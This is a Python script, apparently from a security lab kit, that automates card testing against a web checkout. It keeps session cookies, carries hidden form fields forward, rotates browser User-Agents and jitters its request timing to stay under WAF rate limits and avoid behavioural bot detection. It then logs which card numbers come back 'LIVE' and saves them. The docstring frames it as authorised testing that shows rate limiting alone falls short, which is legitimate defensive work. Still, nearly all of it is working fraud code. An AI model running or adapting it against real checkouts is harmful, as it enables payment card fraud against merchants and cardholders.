#!/usr/bin/env python3
"""Tier 2/3 -- session-aware, rate-limit-evading carding.

Everything tier 1 does wrong, done right: browse the product page first, GET the
checkout form, keep the cookie jar, carry forward every hidden field the server
(or a WAF) put in the form, rotate the User-Agent, and stay under a plausible
rate limit.

Expected result against Brute Force Prevention alone: it still works, just more
slowly. That is the point of this tier -- rate limiting buys time, not safety.
Expected result against Bot Protection: TLS fingerprinting and User-Agent
analysis end it regardless of pacing, because requests' TLS handshake does not
look like a browser's at any speed.

AUTHORISED LABORATORY USE ONLY. Simulates payment card fraud; run only
against systems you own or have written permission to test. See NOTICE.

Copyright 2026 Michael S Collins. Licensed under the Apache License 2.0.
"""

import random
import time

import requests

import labcards

USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
)


def new_session(rng, target):
    session = requests.Session()
    session.headers.update({
        "User-Agent": rng.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.9",
        "Referer": target.rstrip("/") + "/",
    })
    return session


def main():
    parser = labcards.base_parser(__doc__.splitlines()[0])
    parser.add_argument("--rate", type=float, default=0.5,
                        help="requests per second (keep under the WAF threshold)")
    parser.add_argument("--cards-per-session", type=int, default=5,
                        help="cards to push through one cookie jar before rotating")
    args = parser.parse_args()
    labcards.preflight(args)

    rng = random.Random(args.seed)
    dump = labcards.build_dump(args.count, args.secret, args.seed)
    base = args.target.rstrip("/")
    checkout_url = base + "/checkout"
    tally = labcards.Tally()
    started = time.time()
    interval = 1.0 / args.rate if args.rate > 0 else 0.0

    print(f"tier 2/3: {args.count} cards at {args.rate}/s, "
          f"{args.cards_per_session} per session, against {checkout_url}\n")

    session = None
    for index, record in enumerate(dump):
        if index % args.cards_per_session == 0:
            if session:
                session.close()
            session = new_session(rng, args.target)
            try:
                session.get(base + "/", timeout=args.timeout)
            except requests.RequestException:
                pass

        try:
            form = session.get(checkout_url, timeout=args.timeout)
            fields = labcards.harvest_form_fields(form.text)
            fields.update({
                "cardholder": "A Shopper",
                "card_number": record["pan"],
                "exp_month": record["exp_month"],
                "exp_year": record["exp_year"],
                "cvv": record["cvv"],
                "postcode": "SW1A 1AA",
            })
            response = session.post(checkout_url, data=fields,
                                    headers={"Referer": checkout_url},
                                    timeout=args.timeout, allow_redirects=False)
            outcome = labcards.classify(response.status_code, response.text)
        except requests.RequestException as exc:
            outcome = "error"
            print(f"  {record['pan']}  error: {type(exc).__name__}")

        tally.add(outcome, record)
        if outcome == "approved":
            print(f"  {record['pan']}  exp {record['exp_month']}/{record['exp_year']}  "
                  f"cvv {record['cvv']}  LIVE")
        elif outcome in ("blocked", "challenge"):
            print(f"  {record['pan']}  {outcome}")

        # Jitter the pacing: a metronomic interval is itself a bot signal that
        # behavioural detection picks up even when the rate is low enough.
        time.sleep(max(0.0, interval * rng.uniform(0.6, 1.4)))

    if session:
        session.close()
    print(tally.summary(time.time() - started))
    labcards.save_live(args.out, tally.live)


if __name__ == "__main__":
    main()
